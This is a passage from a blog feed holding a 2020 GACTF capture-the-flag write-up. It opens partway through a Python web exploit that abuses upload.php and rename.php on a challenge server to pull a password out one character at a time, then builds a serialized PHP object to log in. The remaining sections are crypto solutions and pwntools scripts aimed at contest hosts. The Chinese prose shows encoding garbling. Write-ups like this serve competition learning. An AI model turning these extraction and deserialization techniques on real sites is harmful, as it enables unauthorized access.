class="string">&quot;http://124.71.191.175&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://124.71.191.175/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">            session.post(<span class="string">&quot;http://124.71.191.175/upload.php&quot;</span>, files=paramsMultipart, headers=headers)</span><br><span class="line"></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;newname&quot;</span>: <span class="string">&quot;111&quot;</span>, <span class="string">&quot;oldname&quot;</span>: <span class="string">&quot;%s&quot;</span>%name&#125;</span><br><span class="line">            headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://124.71.191.175&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://124.71.191.175/rename.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">            response = requests.post(<span class="string">&quot;http://124.71.191.175/rename.php&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;gml&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                data += <span class="built_in">chr</span>(j)</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            exit(<span class="string">&quot;No!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line">    <span class="comment"># password:qweqweqwe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å‡ºå¯†ç æ˜¯ qweqweqweã€‚ç›´æ¥æ„é€ åºåˆ—åŒ–æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> XCTFGG(<span class="string">&#x27;login&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;XM&#x27;</span>,<span class="string">&#x27;qweqweqwe&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/08/31/2020-GACTF/image-20200830195855714.png" alt="image-20200830195855714"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3><p>å‚è€ƒï¼š<a href="https://math.stackexchange.com/questions/528669/what-is-the-smallest-integer-n-greater-than-1-such-that-the-root-mean-square">https://math.stackexchange.com/questions/528669/what-is-the-smallest-integer-n-greater-than-1-such-that-the-root-mean-square</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;124.71.158.89&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;str + &quot;</span>)</span><br><span class="line">    data = r.recv(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = r.recv(<span class="number">5</span>)</span><br><span class="line">    ans = util.iters.bruteforce(<span class="keyword">lambda</span> x: md5(x + data).hexdigest()[:<span class="number">5</span>] == <span class="built_in">hash</span>, string.ascii_letters + string.digits,</span><br><span class="line">                                length=<span class="number">4</span>, )</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;xxxxx:&quot;</span>, ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof()</span><br><span class="line"></span><br><span class="line">a = <span class="number">48</span></span><br><span class="line">s0, t0 = <span class="number">7</span>, <span class="number">1</span></span><br><span class="line">s1, t1 = s0, t0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    s = s1 * s0 + a * t1 * t0</span><br><span class="line">    t = t1 * s0 + t0 * s1</span><br><span class="line">    s1 = s</span><br><span class="line">    t1 = t</span><br><span class="line">    <span class="keyword">if</span> (s - <span class="number">3</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        y = (s - <span class="number">3</span>) / <span class="number">4</span></span><br><span class="line">        x, flag = gmpy2.iroot(((y + <span class="number">1</span>) * (<span class="number">2</span> * y + <span class="number">1</span>)) / <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">assert</span> flag == <span class="literal">True</span></span><br><span class="line">        r.sendlineafter(<span class="string">&quot;[&gt;] x: &quot;</span>, <span class="built_in">str</span>(x))</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;[&gt;] y: &quot;</span>, <span class="built_in">str</span>(y))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><p>å‚è€ƒ<a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html">https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html</a>ï¼ŒåŸºæœ¬åŸé¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_points</span>(<span class="params">P, Q</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((P[<span class="number">0</span>]*Q[<span class="number">0</span>]-P[<span class="number">1</span>]*Q[<span class="number">1</span>]) % p, (P[<span class="number">0</span>]*Q[<span class="number">1</span>]+P[<span class="number">1</span>]*Q[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span>(<span class="params">P, n</span>):</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add_points(Q, P)</span><br><span class="line">        P = add_points(P, P)</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">A = (<span class="number">68279847973010227567437241690876400434176575735647388141445319082120661</span>, <span class="number">36521392659318312718307506287199839545959127964141955928297920414981390</span>)</span><br><span class="line">B = (<span class="number">84698630137710906531637499064120297563999383201108850561060383338482806</span>, <span class="number">10975400339031190591877824767290004140780471215800442883565278903964109</span>)</span><br><span class="line">g = (<span class="number">29223879291878505213325643878338189297997503744039619988987863719655098</span>, <span class="number">32188620669315455017576071518169599806490004123869726364682284676721556</span>)</span><br><span class="line">p = gcd(A[<span class="number">0</span>]^<span class="number">2</span> + A[<span class="number">1</span>]^<span class="number">2</span> - <span class="number">1</span>, B[<span class="number">0</span>]^<span class="number">2</span> + B[<span class="number">1</span>]^<span class="number">2</span> - <span class="number">1</span>)</span><br><span class="line">p = p / <span class="number">4</span></span><br><span class="line">F = GF(p)</span><br><span class="line">R.&lt;w&gt; = PolynomialRing(F)</span><br><span class="line">K.&lt;w&gt; = F.extension(w^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">g_K = g[<span class="number">0</span>] + g[<span class="number">1</span>]*w</span><br><span class="line">B_K = B[<span class="number">0</span>] + B[<span class="number">1</span>]*w</span><br><span class="line">b = discrete_log(B_K, g_K)</span><br><span class="line"></span><br><span class="line">print(multiply(g, b) == B)</span><br><span class="line"></span><br><span class="line">shared = multiply(A, b)[<span class="number">0</span>]</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431&#x27;</span>)</span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><h3 id="da-Vinci-after-rsa"><a href="#da-Vinci-after-rsa" class="headerlink" title="da Vinci after rsa"></a>da Vinci after rsa</h3><p>å…ˆæ˜¯ä¸ªrsaï¼Œç„¶åæ˜¯è¾¾èŠ¬å¥‡å¯†ç ã€‚</p><p>rsa å‘ç°nå¯ä»¥ç›´æ¥åˆ†è§£ï¼Œæœ‰ä¸‰ä¸ªå› å­ï¼Œä¸¤ä¸ªå› å­çš„æ¬§æ‹‰å€¼éƒ½ä¸ e ä¸äº’ç´ ï¼Œå¹¶ä¸”å› å­æ¯”è¾ƒå°ã€‚</p><p>æƒ³èµ·æ¥ 2016 0CTF ä¸€ä¸ªé¢˜ï¼Œåº”è¯¥æ˜¯å…ˆè¦è§£ä¸‰ä¸ªæ¨¡æ•°æ–¹ç¨‹ï¼Œç„¶åç”¨ CRT æ±‚è§£ã€‚</p><p>16å¹´é‚£ä¸ªé¢˜é¢˜è§£åœ¨è¿™é‡Œï¼š<a href="https://wooyun.js.org/drops/0ctf%20writeup.html">https://wooyun.js.org/drops/0ctf%20writeup.html</a>ã€‚æ±‚ä¸‰ä¸ªæ¨¡æ•°æ–¹ç¨‹å¯ä»¥ç”¨<a href="https://www.wolframalpha.com/åœ¨çº¿æ±‚è§£ã€‚">https://www.wolframalpha.com/åœ¨çº¿æ±‚è§£ã€‚</a></p><p>æ±‚è§£åä½¿ç”¨CRTï¼Œç„¶åå†è¾¾èŠ¬å¥‡å¯†ç è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>)  <span class="comment"># ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm)  <span class="comment"># (è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x1d42aea2879f2e44dea5a13ae3465277b06749ce9059fd8b7b4b560cd861f99144d0775ffffffffffff</span></span><br><span class="line">c = <span class="number">421363015174981309103786520626603807427915973516427836319727073378790974986429057810159449046489151</span></span><br><span class="line">p = <span class="number">9749</span></span><br><span class="line">q = <span class="number">11237753507624591</span></span><br><span class="line">r = n / p / q</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">p_roots = [<span class="number">7361</span>]</span><br><span class="line">q_roots = [<span class="number">2722510300825886</span>, <span class="number">6139772527803903</span>, <span class="number">6537111956662153</span>, <span class="number">8415400986072042</span>, <span class="number">9898464751509789</span>]</span><br><span class="line">r_roots = [<span class="number">180966415225632465120208272366108475667934082405238808958048294287011243645</span>,</span><br><span class="line">           <span class="number">2816114411493328258682873357893989007684496552202823306045771363205185148674391</span>,</span><br><span class="line">           <span class="number">1369135259891793292334345751773139388112378132927363770631732500241630990458667</span>,</span><br><span class="line">           <span class="number">5570877862584063114417410584640901580756179707042774516590562822938385811269597</span>,</span><br><span class="line">           <span class="number">8499052407588078002885931765166137308397074232361087682974448633946350539292222</span>]</span><br><span class="line">m_list = []</span><br><span class="line"><span class="keyword">for</span> pp <span class="keyword">in</span> p_roots:</span><br><span class="line">    <span class="keyword">for</span> qq <span class="keyword">in</span> q_roots:</span><br><span class="line">        <span class="keyword">for</span> rr <span class="keyword">in</span> r_roots:</span><br><span class="line">            res = GCRT([p, q, r], [pp, qq, rr])[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(res, e, n) == c:</span><br><span class="line">                <span class="built_in">print</span> long_to_bytes(res)</span><br><span class="line">flag_enc = <span class="string">&quot;weadfa9987_adwd23123_454f&quot;</span></span><br><span class="line">enc = [<span class="number">1</span>, <span class="number">28657</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">17711</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">46368</span>, <span class="number">75025</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">610</span>, <span class="number">377</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>,</span><br><span class="line">       <span class="number">10946</span>, <span class="number">987</span>]</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>, <span class="number">610</span>, <span class="number">987</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>, <span class="number">10946</span>, <span class="number">17711</span>, <span class="number">28657</span>, <span class="number">46368</span>,</span><br><span class="line">     <span class="number">75025</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag += flag_enc[a.index(i)]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="comment"># w5awd4fa994f87_dwad3123_2</span></span><br><span class="line"><span class="comment"># flag&#123;w5aed4fa994f87_dwad3123_2&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezAES"><a href="#ezAES" class="headerlink" title="ezAES"></a>ezAES</h3><p>å¯†é’¥ä¸¤ä½æœªçŸ¥ï¼Œæ‹¥æœ‰æœ€åä¸€ä¸ªåˆ†ç»„çš„æ˜å¯†æ–‡ï¼Œä»¥åŠå€’æ•°ç¬¬äºŒæ®µå¯†æ–‡çš„å10ä¸ªå­—ç¬¦ï¼Œå¯ä»¥çˆ†ç ´ã€‚</p><p>çˆ†ç ´å‡ºå¯†é’¥åä»åå‘å‰æ±‚å¯†æ–‡å’Œ IV å°±å¥½äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;T0EyZaLRzQmNe2pd&#x27;</span></span><br><span class="line">KEYSIZE = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">message</span>):</span></span><br><span class="line">    p = (KEYSIZE - <span class="built_in">len</span>(message) % KEYSIZE) * <span class="built_in">chr</span>(KEYSIZE - <span class="built_in">len</span>(message) % KEYSIZE)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h = hashlib.md5(key).hexdigest()</span><br><span class="line">SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line">message = <span class="string">&#x27;AES CBC Mode is commonly used in data encryption. What do you know about it?&#x27;</span> + SECRET</span><br><span class="line">message = pad(message)</span><br><span class="line">data1 = <span class="string">&quot;a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">c = data1[<span class="number">-16</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message), <span class="number">0</span>, <span class="number">-16</span>):</span><br><span class="line">    c = strxor(AES.new(key).decrypt(c), message[i - <span class="number">16</span>:i])</span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># str_list = [chr(i) for i in range(255)]</span></span><br><span class="line"><span class="comment"># for c1 in str_list:</span></span><br><span class="line"><span class="comment">#     for c2 in str_list:</span></span><br><span class="line"><span class="comment">#         key = &quot;T0EyZaLRzQmNe2&quot; + c1 + c2</span></span><br><span class="line"><span class="comment">#         if strxor(AES.new(key).decrypt(data1[-16:]), message[-16:])[-10:] == data1[:-16]:</span></span><br><span class="line"><span class="comment">#             print(c1 + c2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="what-r-the-noise"><a href="#what-r-the-noise" class="headerlink" title="what_r_the_noise"></a>what_r_the_noise</h3><p>åŸºæœ¬åŸé¢˜ï¼Œå‚è€ƒï¼š<a href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/">https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;124.71.145.165&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_list</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    s = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span> + s + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    d.append(<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"></span><br><span class="line">    l = get_list()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">        d[j].append(l[j])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    av = <span class="built_in">sum</span>(d[i]) / <span class="built_in">len</span>(d[i])</span><br><span class="line">    result.append(<span class="built_in">int</span>(<span class="built_in">round</span>(av)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> result])</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Web ä¸ Crypto å¤§éƒ¨åˆ†é¢˜ç›®éš¾åº¦ä¸å¤§ï¼Œæ•´ç†ä¸‹é¢˜è§£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
    
    
    <category term="CTF.wp" scheme="https://igml.top/tags/CTF-wp/"/>
    
  </entry>
  
  <entry>
    <title>2020 å¼ºç½‘æ¯ writeup</title>
    <link href="https://igml.top/2020/08/28/2020-qwb/"/>
    <id>https://igml.top/2020/08/28/2020-qwb/</id>
    <published>2020-08-28T08:30:49.000Z</published>
    <updated>2020-08-28T08:44:42.678Z</updated>
    
